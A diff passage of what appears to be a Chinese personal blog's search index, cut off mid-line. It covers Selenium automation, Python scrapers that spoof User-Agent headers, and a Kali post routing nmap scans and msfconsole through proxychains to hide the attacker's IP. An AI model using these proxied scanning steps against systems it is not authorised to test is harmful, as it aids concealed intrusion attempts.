-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find_element_by_id()</span><br><span class="line">find_element_by_name()</span><br><span class="line">find_element_by_class_name()</span><br><span class="line">find_element_by_tag_name()</span><br><span class="line">find_element_by_link_text()</span><br><span class="line">find_element_by_partial_link_text()</span><br><span class="line">find_element_by_xpath()</span><br><span class="line">find_element_by_css_selector()</span><br></pre></td></tr></table></figure>
-<p>注意</p>
-<p>1、find_element_by_xxx找的是第一个符合条件的标签，find_elements_by_xxx找的是所有符合条件的标签。</p>
-<p>2、根据ID、CSS选择器和XPath获取，它们返回的结果完全一致。</p>
-<p>3、另外，Selenium还提供了通用方法<code>find_element()</code>，它需要传入两个参数：查找方式<code>By</code>和值。实际上，它就是<code>find_element_by_id()</code>这种方法的通用函数版本，比如<code>find_element_by_id(id)</code>就等价于<code>find_element(By.ID, id)</code>，二者得到的结果完全一致。</p>
-<h2 id="键盘操作"><a class="header-anchor" href="#键盘操作">¶</a>键盘操作</h2>
-<p>想要调用键盘按键操作，需要引入keys包:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br></pre></td></tr></table></figure>
-<p>示例: 在谷歌首页输入’美女’  并且按下回车键完成搜索</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span>  sleep</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    b = webdriver.Chrome()</span><br><span class="line">    b.get(<span class="string">&#x27;https://www.google.com/webhp?ie=UTF-8&#x27;</span>)</span><br><span class="line">    b.find_element_by_xpath(<span class="string">&#x27;//input[@class=&quot;gLFyf gsfi&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;美女&#x27;</span>)</span><br><span class="line">    b.find_element_by_xpath(<span class="string">&#x27;//input[@class=&quot;gLFyf gsfi&quot;]&#x27;</span>).send_keys(Keys.ENTER)</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    b.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>更多其他操作参考: <a href="https://www.itread01.com/content/1496631486.html">https://www.itread01.com/content/1496631486.html</a></p>
-<h2 id="节点交互"><a class="header-anchor" href="#节点交互">¶</a><strong>节点交互</strong></h2>
-<p>Selenium可以驱动浏览器来执行一些操作，也就是说可以让浏览器模拟执行一些动作。比较常见的用法有：输入文字时用<code>send_keys()</code>方法，清空文字时用<code>clear()</code>方法，点击按钮时用<code>click()</code>方法。示例如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">import time</span><br><span class="line">browser &#x3D; webdriver.Chrome()</span><br><span class="line">browser.get(&#39;https:&#x2F;&#x2F;www.taobao.com&#39;)</span><br><span class="line">input &#x3D; browser.find_element_by_id(&#39;q&#39;)</span><br><span class="line">input.send_keys(&#39;MAC&#39;)</span><br><span class="line">time.sleep(1)</span><br><span class="line">input.clear()</span><br><span class="line">input.send_keys(&#39;IPhone&#39;)</span><br><span class="line">button &#x3D; browser.find_element_by_class_name(&#39;btn-search&#39;)</span><br><span class="line">button.click()</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>
-<h2 id="动作链"><a class="header-anchor" href="#动作链">¶</a><strong>动作链</strong></h2>
-<p>在上面的实例中，一些交互动作都是针对某个节点执行的。比如，对于输入框，我们就调用它的输入文字和清空文字方法；对于按钮，就调用它的点击方法。其实，还有另外一些操作，它们没有特定的执行对象，比如鼠标拖曳、键盘按键等，这些动作用另一种方式来执行，那就是动作链。</p>
-<p>比如，现在实现一个节点的拖曳操作，将某个节点从一处拖曳到另外一处，可以这样实现：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">url = <span class="string">&#x27;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#x27;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">&#x27;iframeResult&#x27;</span>)</span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">&#x27;#draggable&#x27;</span>)</span><br><span class="line">target = browser.find_element_by_css_selector(<span class="string">&#x27;#droppable&#x27;</span>)</span><br><span class="line">actions = ActionChains(browser)</span><br><span class="line"><span class="comment"># actions.drag_and_drop(source, target)</span></span><br><span class="line">actions.click_and_hold(source)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    actions.move_by_offset(xoffset=<span class="number">17</span>,yoffset=<span class="number">0</span>).perform()</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">actions.release()</span><br></pre></td></tr></table></figure>
-<h2 id="执行JavaScript"><a class="header-anchor" href="#执行JavaScript">¶</a><strong>执行JavaScript</strong></h2>
-<p>对于某些操作，Selenium API并没有提供。比如，下拉进度条，它可以直接模拟运行JavaScript，此时使用<code>execute_script()</code>方法即可实现，代码如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.jd.com/&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&#x27;window.scrollTo(0, document.body.scrollHeight)&#x27;</span>)</span><br><span class="line">browser.execute_script(<span class="string">&#x27;alert(&quot;123&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="获取页面源码数据"><a class="header-anchor" href="#获取页面源码数据">¶</a><strong>获取页面源码数据</strong></h2>
-<p>通过<code>page_source</code>属性可以获取网页的源代码，接着就可以使用解析库（如正则表达式、Beautiful Soup、pyquery等）来提取信息了。</p>
-<h2 id="前进和后退"><a class="header-anchor" href="#前进和后退">¶</a><strong>前进和后退</strong></h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#模拟浏览器的前进后退</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.taobao.com&#x27;</span>)</span><br><span class="line">browser.get(<span class="string">&#x27;http://www.sina.com.cn/&#x27;</span>)</span><br><span class="line">browser.back()</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br><span class="line">browser.forward()</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure>
-<h2 id="Cookie处理"><a class="header-anchor" href="#Cookie处理">¶</a><strong>Cookie处理</strong></h2>
-<p>使用Selenium，还可以方便地对Cookies进行操作，例如获取、添加、删除Cookies等。示例如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">&#x27;https://www.zhihu.com/explore&#x27;</span>)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.add_cookie(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;domain&#x27;</span>: <span class="string">&#x27;www.zhihu.com&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>&#125;)</span><br><span class="line">print(browser.get_cookies())</span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line">print(browser.get_cookies())</span><br></pre></td></tr></table></figure>
-<h2 id="异常处理"><a class="header-anchor" href="#异常处理">¶</a><strong>异常处理</strong></h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException,NoSuchElementException,NoSuchFrameException</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    browser=webdriver.Chrome()</span><br><span class="line">    browser.get(<span class="string">&#x27;http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable&#x27;</span>)</span><br><span class="line">    browser.switch_to.frame(<span class="string">&#x27;iframssseResult&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> TimeoutException <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">except</span> NoSuchFrameException <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    browser.close()</span><br></pre></td></tr></table></figure>
-<h2 id="phantomJS"><a class="header-anchor" href="#phantomJS">¶</a><strong>phantomJS</strong></h2>
-<p>PhantomJS是一款无界面的浏览器，其自动化操作流程和上述操作谷歌浏览器是一致的。由于是无界面的，为了能够展示自动化操作流程，PhantomJS为用户提供了一个截屏的功能，使用save_screenshot函数实现。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># phantomjs路径</span></span><br><span class="line">path = <span class="string">r&#x27;PhantomJS驱动路径&#x27;</span></span><br><span class="line">browser = webdriver.PhantomJS(path)</span><br><span class="line"><span class="comment"># 打开百度</span></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/&#x27;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">browser.save_screenshot(<span class="string">r&#x27;phantomjs\baidu.png&#x27;</span>)</span><br><span class="line"><span class="comment"># 查找input输入框</span></span><br><span class="line">my_input = browser.find_element_by_id(<span class="string">&#x27;kw&#x27;</span>)</span><br><span class="line"><span class="comment"># 往框里面写文字</span></span><br><span class="line">my_input.send_keys(<span class="string">&#x27;美女&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#截屏</span></span><br><span class="line">browser.save_screenshot(<span class="string">r&#x27;phantomjs\meinv.png&#x27;</span>)</span><br><span class="line"><span class="comment"># 查找搜索按钮</span></span><br><span class="line">button = browser.find_elements_by_class_name(<span class="string">&#x27;s_btn&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">button.click()</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">browser.save_screenshot(<span class="string">r&#x27;phantomjs\show.png&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>
-<h2 id="谷歌无头浏览器"><a class="header-anchor" href="#谷歌无头浏览器">¶</a><strong>谷歌无头浏览器</strong></h2>
-<p>由于PhantomJs最近已经停止了更新和维护，所以推荐大家可以使用谷歌的无头浏览器，是一款无界面的谷歌浏览器。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 创建一个参数对象，用来控制chrome以无界面模式打开</span></span><br><span class="line">chrome_options = Options()</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">chrome_options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line"><span class="comment"># 驱动路径</span></span><br><span class="line">path = <span class="string">r&#x27;C:\Users\ZBLi\Desktop\1801\day05\ziliao\chromedriver.exe&#x27;</span></span><br><span class="line"><span class="comment"># 创建浏览器对象</span></span><br><span class="line">browser = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)</span><br><span class="line"><span class="comment"># 上网</span></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com/&#x27;</span></span><br><span class="line">browser.get(url)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">browser.save_screenshot(<span class="string">&#x27;baidu.png&#x27;</span>)</span><br><span class="line">browser.quit()</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>编程学习</category>
         <category>python</category>
@@ -2377,6 +2380,35 @@ index.php</p>
       </categories>
   </entry>
   <entry>
+    <title>在kali使用代理进行隐形攻击</title>
+    <url>/2021/02/10/%E5%9C%A8kali%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E9%9A%90%E5%BD%A2%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h2 id="一、下载-proxychains-ng，并安装"><a class="header-anchor" href="#一、下载-proxychains-ng，并安装">¶</a>一、下载 proxychains-ng，并安装</h2>
+<p>下载源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;rofl0r&#x2F;proxychains-ng.git</span><br></pre></td></tr></table></figure>
+<p>编译安装</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd proxychains-ng&#x2F;</span><br><span class="line"></span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">make install-config</span><br></pre></td></tr></table></figure>
+<h2 id="二、proxychains-配置"><a class="header-anchor" href="#二、proxychains-配置">¶</a>二、proxychains 配置</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf </span><br></pre></td></tr></table></figure>
+<p>在最后面加上代理服务器和端口</p>
+<p><img src="https://img-blog.csdnimg.cn/20210210130749191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>我这里使用的是V2ray的本地代理  <strong>需要注意的是需要再V2ray里面开启下面选项</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/2021021013091916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="三、proxychains-使用"><a class="header-anchor" href="#三、proxychains-使用">¶</a>三、proxychains 使用</h2>
+<p>尝试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains firefox  https:&#x2F;&#x2F;www.dnsleaktest.com&#x2F;</span><br></pre></td></tr></table></figure>
+<p>发现成功更改了ip</p>
+<p><img src="https://img-blog.csdnimg.cn/20210210131123329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>以后进行渗透测试就可以</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap --top-ports 5 -Pn -sV  wh1tecell.top </span><br><span class="line"></span><br><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>
+<p>都能看到成功的回显</p>
+<p><strong>总结</strong>  搞个代理走了不少坑 差点把虚拟机搞没了 还好有快照我的ma啊</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+        <category>kali之proxychains</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ssh弱口令爆破远程登录渗透过程</title>
     <url>/2020/12/19/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<p>记一次ssh弱口令爆破远程登录渗透过程</p>
@@ -2435,35 +2467,6 @@ index.php</p>
       <categories>
         <category>渗透测试</category>
         <category>ssh弱口令爆破</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>在kali使用代理进行隐形攻击</title>
-    <url>/2021/02/10/%E5%9C%A8kali%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E8%BF%9B%E8%A1%8C%E9%9A%90%E5%BD%A2%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h2 id="一、下载-proxychains-ng，并安装"><a class="header-anchor" href="#一、下载-proxychains-ng，并安装">¶</a>一、下载 proxychains-ng，并安装</h2>
-<p>下载源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;rofl0r&#x2F;proxychains-ng.git</span><br></pre></td></tr></table></figure>
-<p>编译安装</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd proxychains-ng&#x2F;</span><br><span class="line"></span><br><span class="line">.&#x2F;configure --prefix&#x3D;&#x2F;usr --sysconfdir&#x3D;&#x2F;etc</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">make install-config</span><br></pre></td></tr></table></figure>
-<h2 id="二、proxychains-配置"><a class="header-anchor" href="#二、proxychains-配置">¶</a>二、proxychains 配置</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf </span><br></pre></td></tr></table></figure>
-<p>在最后面加上代理服务器和端口</p>
-<p><img src="https://img-blog.csdnimg.cn/20210210130749191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>我这里使用的是V2ray的本地代理  <strong>需要注意的是需要再V2ray里面开启下面选项</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/2021021013091916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="三、proxychains-使用"><a class="header-anchor" href="#三、proxychains-使用">¶</a>三、proxychains 使用</h2>
-<p>尝试</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains firefox  https:&#x2F;&#x2F;www.dnsleaktest.com&#x2F;</span><br></pre></td></tr></table></figure>
-<p>发现成功更改了ip</p>
-<p><img src="https://img-blog.csdnimg.cn/20210210131123329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>以后进行渗透测试就可以</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap --top-ports 5 -Pn -sV  wh1tecell.top </span><br><span class="line"></span><br><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure>
-<p>都能看到成功的回显</p>
-<p><strong>总结</strong>  搞个代理走了不少坑 差点把虚拟机搞没了 还好有快照我的ma啊</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-        <category>kali之proxychains</category>
       </categories>
   </entry>
   <entry>
@@ -2588,6 +2591,30 @@ index.php</p>
       </categories>
   </entry>
   <entry>
+    <title>python爬虫学习(一)</title>
+    <url>/2021/02/20/%E7%88%AC%E8%99%AB%E4%BA%94%E4%B8%AA%E6%A1%88%E4%BE%8B%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<p><strong>这五个案例没有用到数据解析是比较基础的操作 为的是熟悉操作</strong></p>
+<h4 id="案例2-1-爬取搜狗搜索结果"><a class="header-anchor" href="#案例2-1-爬取搜狗搜索结果">¶</a>案例2.1 爬取搜狗搜索结果</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.1</span></span><br><span class="line"><span class="string">    任务目标：根据输入的关键词，爬取该关键词通过搜狗引擎搜索得到的结果网页</span></span><br><span class="line"><span class="string">    知识点：带参调用request.get() UA检测和UA伪装</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># UA伪装：将浏览器对应的User-Agent封装到字典中</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/85.0.4183.83 Safari/537.36 &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    baseurl = <span class="string">&quot;https://www.sogou.com/web?&quot;</span></span><br><span class="line">    keyword = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的词汇：&quot;</span>)</span><br><span class="line">    param = &#123;  <span class="comment"># 以字典的形式存储查询的关键字</span></span><br><span class="line">        <span class="string">&#x27;query&#x27;</span>: keyword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 以带参数的方式调用get方法</span></span><br><span class="line">    response = requests.get(baseurl, params=param, headers=headers)</span><br><span class="line">    print(response.text)</span><br></pre></td></tr></table></figure>
+<h4 id="案例2-2-破解百度翻译"><a class="header-anchor" href="#案例2-2-破解百度翻译">¶</a>案例2.2 破解百度翻译</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.2</span></span><br><span class="line"><span class="string">    任务目标：根据输入的关键词，爬取百度翻译的结果</span></span><br><span class="line"><span class="string">    知识点：抓包分析 带参调用request.post() 存储json文件</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1.制定url</span></span><br><span class="line">    post_url = <span class="string">&#x27;https://fanyi.baidu.com/sug&#x27;</span></span><br><span class="line">    kw = <span class="built_in">input</span>(<span class="string">&quot;请输入要翻译的单词：&quot;</span>)</span><br><span class="line">    <span class="comment"># 2.以字典的形式存储要翻译的单词</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;kw&#x27;</span>: kw</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 3.UA伪装</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/85.0.4183.83 Safari/537.36 &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 4.请求发送</span></span><br><span class="line">    response = requests.post(url=post_url, data=data, headers=headers)</span><br><span class="line">    <span class="comment"># 5.获取相应数据 (只有确认返回类型是json才能调用json方法 返回字典对象)</span></span><br><span class="line">    dic_obj = response.json()</span><br><span class="line">    print(dic_obj)</span><br><span class="line">    <span class="comment"># 6.持久化存储</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;./&#123;&#125;.json&#x27;</span>.<span class="built_in">format</span>(kw), <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    json.dump(dic_obj, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">&quot;爬取结束&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="案例2-3-爬取豆瓣电影排行榜"><a class="header-anchor" href="#案例2-3-爬取豆瓣电影排行榜">¶</a>案例2.3 爬取豆瓣电影排行榜</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.3</span></span><br><span class="line"><span class="string">    任务目标：爬取豆瓣喜剧类型电影排行榜</span></span><br><span class="line"><span class="string">    知识点：抓包分析 带参调用request.get() 存储json文件</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1.制定url</span></span><br><span class="line">    url = <span class="string">&quot;https://movie.douban.com/j/chart/top_list&quot;</span></span><br><span class="line">    <span class="comment"># Request URL中的参数信息，可以通过字典的方式写入param中，并作为get方法的参数使用</span></span><br><span class="line">    param = &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;interval_id&quot;</span>: <span class="string">&quot;100:90&quot;</span>,</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;start&quot;</span>: <span class="string">&quot;0&quot;</span>,  <span class="comment"># 从第几部电影中取</span></span><br><span class="line">            <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;20&quot;</span>   <span class="comment"># 一次取出的电影个数</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment"># 2.UA伪装</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/85.0.4183.83 Safari/537.36 &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 3.请求发送</span></span><br><span class="line">    response = requests.get(url=url, params=param, headers=headers)</span><br><span class="line">    <span class="comment"># 4.获取数据</span></span><br><span class="line">    list_data = response.json()</span><br><span class="line">    <span class="comment"># 5.持久化存储</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;./豆瓣电影排行榜.json&#x27;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    json.dump(list_data, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">&quot;爬取结束&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="案例2-4-爬取肯德基餐厅查询结果"><a class="header-anchor" href="#案例2-4-爬取肯德基餐厅查询结果">¶</a>案例2.4 爬取肯德基餐厅查询结果</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.4</span></span><br><span class="line"><span class="string">    任务目标：根据输入的关键词，爬取肯德基餐厅查询的结果</span></span><br><span class="line"><span class="string">    知识点：抓包分析 带参调用request.post()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1.制定url</span></span><br><span class="line">    post_url = <span class="string">&#x27;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=keyword&#x27;</span></span><br><span class="line">    kw = <span class="built_in">input</span>(<span class="string">&quot;请输入餐厅关键字：&quot;</span>)</span><br><span class="line">    <span class="comment"># 2.以字典的形式存储关键字</span></span><br><span class="line">    data = &#123;</span><br><span class="line">            <span class="string">&quot;cname&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pid&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;keyword&quot;</span>: kw,</span><br><span class="line">            <span class="string">&quot;pageIndex&quot;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;pageSize&quot;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment"># 3.UA伪装</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/85.0.4183.83 Safari/537.36 &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 4.请求发送</span></span><br><span class="line">    response = requests.post(url=post_url, data=data, headers=headers)</span><br><span 